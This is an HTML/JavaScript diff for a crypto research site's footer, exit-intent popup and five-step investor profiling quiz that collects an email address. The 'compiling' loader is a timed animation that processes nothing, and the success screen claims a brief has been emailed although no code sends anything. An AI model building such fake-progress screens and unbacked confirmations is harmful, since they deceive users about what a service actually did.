+<!-- ▓▓▓ FOOTER ▓▓▓ -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-brand">
+        <svg width="20" height="20" viewBox="0 0 26 26" fill="none" aria-hidden="true">
+          <rect width="26" height="26" rx="5" fill="#1E3A8A"/>
+          <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white"/>
+          <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6"/>
+          <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4"/>
+          <rect x="5" y="14" width="16" height="2.5" rx="1" fill="white" opacity="0.25"/>
+        </svg>
+        <span class="footer-brand-name">Crypto Briefing</span>
+      </div>
+      <p class="footer-legal">Crypto Briefing is an independent digital media publication providing news coverage, project evaluations, and quantitative ratings for the cryptocurrency and blockchain sector. SIMETRI ratings are research opinions and do not constitute investment advice, financial advice, trading advice, or any other type of advice. Crypto Briefing does not recommend that any asset should be bought, sold, or held. Always conduct your own due diligence.</p>
+    </div>
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Service</a>
+      <a href="#">SIMETRI Methodology</a>
+      <a href="#">Editorial Policy</a>
+      <a href="#">Advertise</a>
+      <a href="#">Contact</a>
+    </div>
+  </div>
+  <div style="max-width:1160px;margin:0 auto;padding:0 28px;">
+    <div class="footer-bottom">
+      <span>© <span id="footer-year"></span> Crypto Briefing. All rights reserved.</span>
+      <span>Independent since 2017 · No advertiser access to editorial conclusions</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ══════════════════════════════════
+     EXIT POPUP
+══════════════════════════════════ -->
+<div class="overlay" id="exit-overlay" role="dialog" aria-modal="true" aria-label="Free SIMETRI brief invitation">
+  <div class="exit-card">
+    <div class="exit-stripe"></div>
+    <div class="exit-body">
+      <div class="exit-icon">
+        <svg width="38" height="38" viewBox="0 0 38 38" fill="none" aria-hidden="true">
+          <rect width="38" height="38" rx="8" fill="#EFF4FF"/>
+          <rect x="8" y="9" width="22" height="20" rx="3" stroke="#1E3A8A" stroke-width="1.6"/>
+          <line x1="12" y1="15" x2="26" y2="15" stroke="#1E3A8A" stroke-width="1.3"/>
+          <line x1="12" y1="19" x2="21" y2="19" stroke="#1E3A8A" stroke-width="1.3"/>
+          <line x1="12" y1="23" x2="17" y2="23" stroke="#C8A951" stroke-width="1.3"/>
+        </svg>
+      </div>
+      <h2>Your Personalized<br/>SIMETRI Brief Is Free.</h2>
+      <p>Before you go — it takes 90 seconds to profile your research mandate. Crypto Briefing's evaluation engine surfaces only the independent ratings and risk signals that actually apply to your stated scope. No ads, no affiliate rankings.</p>
+      <button class="exit-cta" onclick="closeExitPopup(); openQuiz();">Build My SIMETRI Brief →</button>
+      <button class="exit-dismiss" onclick="closeExitPopup()">No thanks, I'll research without a ratings filter.</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     QUIZ MODAL
+══════════════════════════════════ -->
+<div class="overlay" id="quiz-overlay" role="dialog" aria-modal="true" aria-label="SIMETRI brief profiling questionnaire">
+  <div class="quiz-card">
+    <div class="qc-header">
+      <div class="qc-hd-left">
+        <svg width="18" height="18" viewBox="0 0 26 26" fill="none" aria-hidden="true">
+          <rect width="26" height="26" rx="5" fill="#1E3A8A"/>
+          <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white"/>
+          <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6"/>
+          <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4"/>
+        </svg>
+        <span class="qc-title">SIMETRI Research Brief</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="qc-counter" id="step-counter">Section 1 of 5</span>
+        <button class="qc-close" onclick="closeQuiz()" aria-label="Close">✕</button>
+      </div>
+    </div>
+    <div class="qc-progress"><div class="qc-bar" id="qc-bar" style="width:20%"></div></div>
+
+    <div class="qc-body">
+
+      <!-- Step 1 -->
+      <div class="quiz-step active" id="step-1">
+        <div class="qs-section">Section 01 / 05 — Background</div>
+        <div class="qs-q">How would you describe your experience researching and evaluating cryptocurrency projects?</div>
+        <div class="qs-sub">This calibrates the technical depth of your SIMETRI brief — from foundational project summaries to full quantitative scoring breakdowns.</div>
+        <div class="opt-list" id="opts-1">
+          <div class="opt" onclick="pick(1,this,'Newcomer / Learning')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Newcomer / Learning<span>I'm building foundational knowledge of the asset class and how to evaluate projects objectively.</span></div>
+          </div>
+          <div class="opt" onclick="pick(1,this,'Self-Directed Researcher')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Self-Directed Researcher<span>I read whitepapers, track on-chain metrics, and make independent allocation decisions with multi-cycle experience.</span></div>
+          </div>
+          <div class="opt" onclick="pick(1,this,'Professional Analyst / Finance Background')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Professional Analyst / Finance Background<span>My background is in TradFi or technology research. I approach crypto with structured analytical frameworks.</span></div>
+          </div>
+          <div class="opt" onclick="pick(1,this,'Fund Manager / Institutional Allocator')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Fund Manager / Institutional Allocator<span>I manage capital for a vehicle or institution and require evaluation output compatible with fiduciary standards.</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="quiz-step" id="step-2">
+        <div class="qs-section">Section 02 / 05 — Investment Goal</div>
+        <div class="qs-q">What is the primary investment objective you're evaluating projects against?</div>
+        <div class="qs-sub">Your goal determines which SIMETRI sub-scores receive the highest weighting in your brief — and which risk categories get flagged as structurally relevant.</div>
+        <div class="opt-list" id="opts-2">
+          <div class="opt" onclick="pick(2,this,'Long-Term Capital Appreciation')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Long-Term Capital Appreciation<span>Holding assets over multiple cycles for maximum compound return, accepting near-term volatility.</span></div>
+          </div>
+          <div class="opt" onclick="pick(2,this,'Yield and Passive Income')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Yield and Passive Income<span>Staking, liquidity provision, or protocol participation to generate regular on-chain returns.</span></div>
+          </div>
+          <div class="opt" onclick="pick(2,this,'Diversification from Traditional Assets')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Diversification from Traditional Assets<span>Adding uncorrelated exposure to a multi-asset portfolio with explicit volatility budgets.</span></div>
+          </div>
+          <div class="opt" onclick="pick(2,this,'Active Trading and Short-Term Positioning')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Active Trading and Short-Term Positioning<span>Tactical entries around catalysts, technical structure, or narrative rotation across shorter windows.</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="quiz-step" id="step-3">
+        <div class="qs-section">Section 03 / 05 — Time Horizon</div>
+        <div class="qs-q">What is your realistic holding horizon for the majority of your crypto positions?</div>
+        <div class="qs-sub">Your time horizon determines which vesting cliff events, protocol milestone risks, and macro cycle signals are flagged as material to your brief.</div>
+        <div class="opt-list" id="opts-3">
+          <div class="opt" onclick="pick(3,this,'Under 3 months')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Under 3 months<span>Event-driven or momentum-based positioning with a short defined exit window.</span></div>
+          </div>
+          <div class="opt" onclick="pick(3,this,'3 to 12 months')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">3 to 12 months<span>Swing-to-medium allocation, often aligned with a defined protocol catalyst or market structure inflection.</span></div>
+          </div>
+          <div class="opt" onclick="pick(3,this,'12 to 36 months')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">12 to 36 months<span>Conviction-based positions across a full cycle, evaluated against adoption and development trajectory.</span></div>
+          </div>
+          <div class="opt" onclick="pick(3,this,'Indefinite / No defined exit')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Indefinite / No defined exit<span>Long-duration holdings anchored in structural conviction. Exit is thesis-driven, not time-driven.</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="quiz-step" id="step-4">
+        <div class="qs-section">Section 04 / 05 — Risk Tolerance</div>
+        <div class="qs-q">How do you handle drawdowns in your crypto positions?</div>
+        <div class="qs-sub">Crypto Briefing's risk flags are calibrated to your stated drawdown parameters — so you see the alerts that are actually actionable for your mandate, not generic disclaimers.</div>
+        <div class="opt-list" id="opts-4">
+          <div class="opt" onclick="pick(4,this,'Conservative — I reduce exposure at ~10% drawdown')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Conservative<span>I systematically reduce or exit positions when drawdowns reach approximately 10%. Capital preservation takes priority.</span></div>
+          </div>
+          <div class="opt" onclick="pick(4,this,'Moderate — I hold through 10–25% drawdowns')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Moderate<span>I hold through 10–25% pullbacks if my research thesis remains intact, but reassess at deeper levels.</span></div>
+          </div>
+          <div class="opt" onclick="pick(4,this,'Moderate-High — I hold through 25–50% drawdowns')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Moderate-High<span>I'm prepared for 25–50% temporary drawdowns on high-conviction positions. I average down selectively.</span></div>
+          </div>
+          <div class="opt" onclick="pick(4,this,'Aggressive — I hold regardless of drawdown magnitude')" tabindex="0">
+            <div class="opt-radio"></div>
+            <div class="opt-text">Aggressive<span>I hold through drawdowns of any magnitude if the fundamental thesis remains structurally valid.</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="quiz-step" id="step-5">
+        <div class="qs-section">Section 05 / 05 — Research Scope</div>
+        <div class="qs-q">Which project categories are most relevant to your research scope?</div>
+        <div class="qs-sub">Select all that apply. Your brief will surface SIMETRI ratings only for projects within your stated categories — no irrelevant noise.</div>
+        <div class="tag-grid" id="opts-5">
+          <div class="tag-opt" onclick="toggleTag(this,'Layer 1 Blockchains')"><div class="tag-ck"></div>Layer 1 Blockchains</div>
+          <div class="tag-opt" onclick="toggleTag(this,'Layer 2 / Rollups')"><div class="tag-ck"></div>Layer 2 / Rollups</div>
+          <div class="tag-opt" onclick="toggleTag(this,'DeFi Protocols')"><div class="tag-ck"></div>DeFi Protocols</div>
+          <div class="tag-opt" onclick="toggleTag(this,'Real World Assets (RWA)')"><div class="tag-ck"></div>Real World Assets (RWA)</div>
+          <div class="tag-opt" onclick="toggleTag(this,'Stablecoins')"><div class="tag-ck"></div>Stablecoins</div>
+          <div class="tag-opt" onclick="toggleTag(this,'Infrastructure / Oracles')"><div class="tag-ck"></div>Infrastructure / Oracles</div>
+          <div class="tag-opt" onclick="toggleTag(this,'Gaming / Metaverse')"><div class="tag-ck"></div>Gaming / Metaverse</div>
+          <div class="tag-opt" onclick="toggleTag(this,'NFT Infrastructure')"><div class="tag-ck"></div>NFT Infrastructure</div>
+          <div class="tag-opt" onclick="toggleTag(this,'AI / Data Networks')"><div class="tag-ck"></div>AI / Data Networks</div>
+        </div>
+        <div class="email-block">
+          <label for="email-inp">Your email — to receive your SIMETRI brief</label>
+          <input type="email" id="email-inp" placeholder="you@domain.com" oninput="emailChanged()" autocomplete="email"/>
+          <div class="email-err" id="email-err">Please enter a valid email address.</div>
+        </div>
+      </div>
+
+      <!-- Loader -->
+      <div class="quiz-step" id="step-loader">
+        <div class="loader-pane">
+          <div class="spin-ring"></div>
+          <div class="loader-title">Compiling Your SIMETRI Brief…</div>
+          <div class="loader-sub">Filtering 500+ project ratings against your research scope, risk band, and time horizon. This takes a moment.</div>
+          <div class="chk-list">
+            <div class="chk-item" id="c1"><div class="chk-icon">✓</div>Profile parameters recorded</div>
+            <div class="chk-item" id="c2"><div class="chk-icon">✓</div>Matching SIMETRI project database</div>
+            <div class="chk-item" id="c3"><div class="chk-icon">✓</div>Generating risk-calibrated flags</div>
+            <div class="chk-item" id="c4"><div class="chk-icon">✓</div>Assembling vesting timeline alerts</div>
+            <div class="chk-item" id="c5"><div class="chk-icon">✓</div>Compiling editorial thesis section</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Success -->
+      <div class="quiz-step" id="step-success">
+        <div class="success-pane">
+          <div class="success-ring">
+            <svg width="34" height="34" viewBox="0 0 34 34" fill="none" aria-hidden="true">
+              <path d="M7 17L13 23L27 9" stroke="#16A34A" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h2>Your Brief Is Compiled.</h2>
+          <p>Your personalized SIMETRI Research Brief has been prepared. A confirmation has been sent to your inbox — the full brief, including project ratings, risk flags, and editorial thesis notes, follows within minutes.</p>
+          <div class="report-summary">
+            <div class="rs-title">Brief Summary</div>
+            <div class="rs-row"><span class="rs-k">Experience Level</span><span class="rs-v" id="s-exp">—</span></div>
+            <div class="rs-row"><span class="rs-k">Investment Goal</span><span class="rs-v" id="s-goal">—</span></div>
+            <div class="rs-row"><span class="rs-k">Time Horizon</span><span class="rs-v" id="s-horizon">—</span></div>
+            <div class="rs-row"><span class="rs-k">Risk Tolerance</span><span class="rs-v" id="s-risk">—</span></div>
+            <div class="rs-row"><span class="rs-k">Research Sectors</span><span class="rs-v" id="s-sectors">—</span></div>
+            <div class="rs-row"><span class="rs-k">Advertiser Influence</span><span class="rs-v" style="color:var(--green)">None — Editorial only</span></div>
+          </div>
+          <button class="btn-confirm" onclick="closeQuiz()">Close &amp; Continue Reading</button>
+          <div class="success-note">Independent research · No affiliate rankings · Unsubscribe any time</div>
+        </div>
+      </div>
+
+    </div><!-- /qc-body -->
+
+    <div class="qc-footer" id="qc-footer">
+      <button class="qc-back" id="qc-back" onclick="goBack()" disabled>← Back</button>
+      <button class="qc-next" id="qc-next" onclick="goNext()" disabled>Continue →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ── STATE ─────────────────── */
+const ans = { sectors: [] };
+let step = 1;
+const TOTAL = 5;
+let exitShown = false;
+let exitTimer = null;
+
+/* ── INIT ──────────────────── */
+document.addEventListener('DOMContentLoaded', () => {
+  const yr = new Date().getFullYear();
+  document.getElementById('footer-year').textContent = yr;
+  const now = new Date().toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
+  const scDate = document.getElementById('sc-date');
+  const rcDate = document.getElementById('rc-date');
+  if (scDate) scDate.textContent = now;
+  if (rcDate) rcDate.textContent = now;
+
+  exitTimer = setTimeout(() => { if (!exitShown) triggerExit(); }, 6500);
+  document.addEventListener('mouseleave', e => { if (e.clientY < 10 && !exitShown) triggerExit(); });
+});
+
+/* ── EXIT POPUP ────────────── */
+function triggerExit() {
+  if (document.getElementById('quiz-overlay').classList.contains('active')) return;
+  exitShown = true;
+  clearTimeout(exitTimer);
+  show('exit-overlay');
+  lockScroll();
+}
+function closeExitPopup() { hide('exit-overlay'); unlockScroll(); }
+
+/* ── QUIZ ──────────────────── */
+function openQuiz() {
+  closeExitPopup();
+  show('quiz-overlay');
+  lockScroll();
+  exitShown = true;
+}
+function closeQuiz() { hide('quiz-overlay'); unlockScroll(); }
+
+function show(id) { document.getElementById(id).classList.add('active'); }
+function hide(id) { document.getElementById(id).classList.remove('active'); }
+function lockScroll()   { document.body.style.overflow = 'hidden'; }
+function unlockScroll() { document.body.style.overflow = ''; }
+
+/* overlay click-outside */
+['quiz-overlay','exit-overlay'].forEach(id => {
+  document.getElementById(id).addEventListener('click', function(e) {
+    if (e.target === this) { hide(id); unlockScroll(); }
+  });
+});
+
+/* ── OPTIONS ───────────────── */
+function pick(s, el, val) {
+  document.getElementById('opts-' + s).querySelectorAll('.opt').forEach(o => o.classList.remove('sel'));
+  el.classList.add('sel');
+  ans['s' + s] = val;
+  document.getElementById('qc-next').disabled = false;
+}
+
+function toggleTag(el, val) {
+  el.classList.toggle('sel');
+  ans.sectors = el.classList.contains('sel')
+    ? [...new Set([...ans.sectors, val])]
+    : ans.sectors.filter(v => v !== val);
+  checkStep5();
+}
+
+function emailChanged() {
+  const inp = document.getElementById('email-inp');
+  const val = inp.value.trim();
+  const ok  = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+  inp.classList.toggle('err', !ok && val.length > 0);
+  document.getElementById('email-err').style.display = (!ok && val.length > 0) ? 'block' : 'none';
+  ans.email = val;
+  checkStep5();
+}
+
+function checkStep5() {
+  const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((document.getElementById('email-inp').value || '').trim());
+  document.getElementById('qc-next').disabled = !ok;
+}
+
+function step5Ready() {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((document.getElementById('email-inp').value || '').trim());
+}
+
+/* ── NAV ───────────────────── */
+function renderStep(n) {
+  document.querySelectorAll('.quiz-step').forEach(s => s.classList.remove('active'));
+  const el = document.getElementById('step-' + n);
+  if (el) el.classList.add('active');
+
+  const footer = document.getElementById('qc-footer');
+  const counter = document.getElementById('step-counter');
+  const isSpecial = (n === 'loader' || n === 'success');
+
+  if (isSpecial) {
+    footer.style.display = 'none';
+    counter.textContent = n === 'loader' ? 'Compiling…' : 'Complete';
+  } else {
+    footer.style.display = 'flex';
+    counter.textContent = 'Section ' + n + ' of ' + TOTAL;
+    document.getElementById('qc-back').disabled = (n === 1);
+    document.getElementById('qc-next').textContent = (n === TOTAL) ? 'Compile My Brief →' : 'Continue →';
+    document.getElementById('qc-bar').style.width = ((n / TOTAL) * 100) + '%';
+
+    const alreadyDone = n < TOTAL ? !!ans['s' + n] : step5Ready();
+    document.getElementById('qc-next').disabled = !alreadyDone;
+  }
+}
+
+function goNext() {
+  if (step < TOTAL) { step++; renderStep(step); }
+  else { submitFlow(); }
+}
+function goBack() { if (step > 1) { step--; renderStep(step); } }
+
+/* ── LOADER ────────────────── */
+function submitFlow() {
+  renderStep('loader');
+  const ids = ['c1','c2','c3','c4','c5'];
+  ids.forEach(id => document.getElementById(id).classList.remove('done'));
+  ids.forEach((id, i) => {
+    setTimeout(() => document.getElementById(id).classList.add('done'), 600 + i * 650);
+  });
+  setTimeout(() => { populateSuccess(); renderStep('success'); }, 600 + ids.length * 650 + 320);
+}
+
+function populateSuccess() {
+  const riskMap = {
+    'Conservative — I reduce exposure at ~10% drawdown': 'Conservative',
+    'Moderate — I hold through 10–25% drawdowns': 'Moderate',
+    'Moderate-High — I hold through 25–50% drawdowns': 'Moderate-High',
+    'Aggressive — I hold regardless of drawdown magnitude': 'Aggressive'
+  };
+  const horizonMap = {
+    'Under 3 months': '< 3 Months',
+    '3 to 12 months': '3–12 Months',
+    '12 to 36 months': '12–36 Months',
+    'Indefinite / No defined exit': 'Indefinite'
+  };
+  set('s-exp',    ans.s1 || '—');
+  set('s-goal',   ans.s2 || '—');
+  set('s-horizon', horizonMap[ans.s3] || ans.s3 || '—');
+  set('s-risk',   riskMap[ans.s4] || ans.s4 || '—');
+  set('s-sectors', ans.sectors.length > 0 ? ans.sectors.length + ' categories' : 'General coverage');
+}
+function set(id, val) { const el = document.getElementById(id); if (el) el.textContent = val; }
+
+/* ── KEYBOARD ──────────────── */
+document.querySelectorAll('.opt').forEach(el => {
+  el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); el.click(); } });
+});
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') { closeQuiz(); closeExitPopup(); }
+});
+</script>
+</body>
 </html>
